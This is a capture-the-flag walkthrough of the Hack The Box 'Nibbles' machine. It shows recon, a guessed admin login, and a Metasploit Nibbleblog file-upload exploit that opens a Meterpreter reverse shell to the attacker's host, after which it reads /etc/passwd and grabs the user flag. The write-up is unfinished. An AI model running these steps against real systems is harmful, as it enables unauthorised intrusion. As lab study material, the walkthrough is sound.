# [01 - Nibbles](https://app.hackthebox.com/machines/Nibbles)

![Nibbles.png](Nibbles.png)

## description
> 10.10.10.75

## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- nibbles.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-29 17:11 MDT
Nmap scan report for nibbles.htb (10.10.10.75)
Host is up (0.059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

while waiting for nmap, check 80:
```
$ curl -v http://nibbles.htb
*   Trying 10.10.10.75:80...
* Connected to nibbles.htb (10.10.10.75) port 80 (#0)
> GET / HTTP/1.1
> Host: nibbles.htb
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 29 Jul 2022 23:01:26 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
< ETag: "5d-5616c3cf7fa77"
< Accept-Ranges: bytes
< Content-Length: 93
< Vary: Accept-Encoding
< Content-Type: text/html
<
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

ok, looks like we know where we're going

`/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised`

definitely PHP

seeing a 404 for `GET /nibbleblog/content/private/plugins/my_image/image.jpg HTTP/1.1`

and `content` allows directory listing
  * private
  * public
  * tmp

`tmp` is empty

and.. private is accessible?

using `wget --recursive` and some probably unnecessary flags, crawled the contents of.. `content` and found a bunch of nothing. did find a couple images

```
$ find . -iname '*.jpg'
./nibbles.htb/nibbleblog/content/public/upload/nibbles_0_o.jpg
./nibbles.htb/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg
./nibbles.htb/nibbleblog/content/public/upload/nibbles_0_thumb.jpg
```

no strings, zsteg or bw content, so moving on.

### nibble

assumed `Powered by Nibbleblog` was a red herring and that this blog posting/hosting software was something homegrown, or at least forked from something more mainstream. searched for `index.php controller=blog action=view category=music` and got to [http://letsmaketech.com/index.php?controller=blog&action=view&category=articles](http://letsmaketech.com/index.php?controller=blog&action=view&category=articles) which uses the same URI format.. and is also `Powered by Nibbleblog`. ok, so this is a real thing that someone actually named their software.

```
msf6 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
```

this box was released in 2018, so a bit late, but still possible.

however, the module is authenticated, so while it does get us RCE, it doesn't get us there yet.

looking around for a place to even login, eventually get to `nibbles.htb/nibbleblog/admin`, which doesn't give us login, but does `http://nibbles.htb/nibbleblog/admin/ajax/`
which has
  * `uploader (copy).php`
  * `uploader.php`

with slightly different file sizes.

```
$ curl 'http://nibbles.htb/nibbleblog/admin/ajax/uploader%20(copy).php'
<error><![CDATA[1]]></error><alert><![CDATA[Nibbleblog security error(1024)]]></alert>
```

but one of the response headers is `Content-Type: application/json`, so not parsing properly in the browser

and the 'non copy' version returns the same content, but with `Content-Type: text/xml;charset=UTF-8`

so was the content type the only change? what are we supposed to send to it?

[https://github.com/dignajar/nibbleblog/blob/master/admin/ajax/uploader.php](https://github.com/dignajar/nibbleblog/blob/master/admin/ajax/uploader.php) was last changed on 2014/02/27, so possible

the committed version says it will return json


```
http://nibbles.htb/nibbleblog/admin.php
```

gives us a username/password prompt

```
var HTML_PATH_ROOT = "/nibbleblog/";
var HTML_PATH_ADMIN = "/nibbleblog/admin/";
var HTML_PATH_ADMIN_AJAX = "/nibbleblog/admin/ajax/";
var HTML_PATH_ADMIN_JS = "/nibbleblog/admin/js/";
var HTML_PATH_ADMIN_TEMPLATES = "/nibbleblog/admin/templates/";
var _MAX_FILE_SIZE = 1024 * 3000;
```

`http://nibbles.htb/nibbleblog/install.php` gives
> Blog already installed... May be you want to update ?

update is a link to [http://nibbles.htb/nibbleblog/update.php](http://nibbles.htb/nibbleblog/update.php)

which GETting gives us
```
DB updated: ./content/private/config.xml

DB updated: ./content/private/comments.xml

Categories updated...



Nibbleblog 4.0.3 "Coffee" ©2009 - 2014 | Developed by Diego Najar
```

finally, confirmation of the version - and 4.0.3 is what msf supports, so we're on the right path

so figure out what `Nibbleblog security error(1024)` is about, use it for LFI, and then find creds?

### coming back

`content/private/config.xml` has different content when we request with curl vs. firefox

in the firefox response, see

```
 const o = JSON.parse(decodeURIComponent(escape(atob('eyJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEwMS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMS4wIiwiYXBwVmVyc2lvbiI6IjUuMCAoWDExKSIsInBsYXRmb3JtIjoiTGludXgiLCJ2ZW5kb3IiOiIiLCJwcm9kdWN0IjoiR2Vja28iLCJ1c2VyQWdlbnREYXRhIjoiW2RlbGV0ZV0iLCJvc2NwdSI6IkxpbnV4IHg4Nl82NCIsInByb2R1Y3RTdWIiOiIyMDEwMDEwMSIsImJ1aWxkSUQiOiIyMDE4MTAwMTAwMDAwMCJ9'))))
```

```
08:37:11.406 o = JSON.parse(decodeURIComponent(escape(atob('eyJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEwMS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMS4wIiwiYXBwVmVyc2lvbiI6IjUuMCAoWDExKSIsInBsYXRmb3JtIjoiTGludXgiLCJ2ZW5kb3IiOiIiLCJwcm9kdWN0IjoiR2Vja28iLCJ1c2VyQWdlbnREYXRhIjoiW2RlbGV0ZV0iLCJvc2NwdSI6IkxpbnV4IHg4Nl82NCIsInByb2R1Y3RTdWIiOiIyMDEwMDEwMSIsImJ1aWxkSUQiOiIyMDE4MTAwMTAwMDAwMCJ9'))))
08:37:11.443
Object { userAgent: "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0", appVersion: "5.0 (X11)", platform: "Linux", vendor: "", product: "Gecko", userAgentData: "[delete]", oscpu: "Linux x86_64", productSub: "20100101", buildID: "20181001000000" }
```

ok, not as interesting as expected

logging in with `admin:nibbles` works, so

```
msf6 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.0.34      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS nibbles.htb
RHOSTS => nibbles.htb
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.13:4444
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.75:40488) at 2023-01-07 08:42:51 -0700

shell

meterpreter >
meterpreter > shell
Process 1570 created.
Channel 0 created.
id -a
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

a foothold!

### nibbler up

```
pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
nibbler:x:1001:1001::/home/nibbler:
ls -la /home/nibbler
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Jan  7 10:30 user.txt
cat /home/nibbler/user.txt
50899abf4d3b0f5de683dd1f6665c601
```

user down

what's in [personal.zip](personal.zip) ?

```
which python
which python3
/usr/bin/python3
cd /home/nibbler
python3 -m http.server
```




## flag
```
user:
root:
```
